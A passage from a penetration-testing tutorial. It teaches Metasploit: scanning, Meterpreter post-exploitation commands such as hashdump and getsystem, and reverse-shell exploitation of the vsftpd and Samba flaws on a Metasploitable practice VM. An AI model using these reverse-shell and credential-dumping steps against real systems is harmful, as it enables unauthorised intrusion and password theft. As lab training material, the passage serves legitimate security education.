# Set payload
set PAYLOAD windows/meterpreter/reverse_tcp

# Set your IP (where connection comes back)
set LHOST your_kali_ip

# Run the exploit
exploit

# Or check if target is vulnerable without exploiting
check
```

**Metasploit modules:**

```bash
# Exploits: Code to take advantage of vulnerabilities
use exploit/path/to/exploit

# Payloads: Code that runs after successful exploit
set PAYLOAD windows/meterpreter/reverse_tcp

# Auxiliary: Scanners, fuzzers, etc.
use auxiliary/scanner/portscan/tcp

# Post: Post-exploitation modules
use post/windows/gather/hashdump
```

**Exercise: Port Scanning with Metasploit**

```bash
# Use TCP port scanner
use auxiliary/scanner/portscan/tcp

# Set target
set RHOSTS target_ip

# Set port range
set PORTS 1-1000

# Run scan
run

# Or exploit syntax
exploit
```

**Exercise: SMB Version Detection**

```bash
# Use SMB version scanner
use auxiliary/scanner/smb/smb_version

# Set target
set RHOSTS target_ip

# Run scanner
run

# Results show Windows version, SMB version
```

#### Meterpreter Basics

**Meterpreter:** Advanced payload providing post-exploitation shell.

**Key features:**
- Runs in memory (hard to detect)
- Encrypted communication
- Extensible with modules
- File system access
- Process manipulation
- Privilege escalation tools

**Common Meterpreter commands:**

```bash
# System information

# Download file
download C:\\path\\to\\file /local/destination/

# Execute command
execute -f cmd.exe -i -H

# Shell access
shell

# Privilege escalation
getsystem

# Password dumping (if admin)
hashdump

# Background session
background

# Return to session
sessions -i 1
```

#### Exercise 17: Metasploitable Practice (20 minutes)

**If you have Metasploitable VM available:**

**Scenario: Exploit vsftpd backdoor**

```bash
# Start msfconsole
sudo msfconsole

# Search for vsftpd
search vsftpd

# Use the backdoor exploit
use exploit/unix/ftp/vsftpd_234_backdoor

# Set target IP
set RHOSTS metasploitable_ip

# Exploit
exploit

# If successful, you have shell access
whoami
# Output: root

# Explore the system
ls
pwd
uname -a

# Exit
exit
```

**Scenario: Exploit Samba**

```bash
# Search for Samba exploits
search samba

# Use username map script exploit
use exploit/multi/samba/usermap_script

# Set target
set RHOSTS metasploitable_ip

# Set payload
set PAYLOAD cmd/unix/reverse

# Set your IP
set LHOST your_kali_ip

# Exploit
exploit

# Shell should open
```
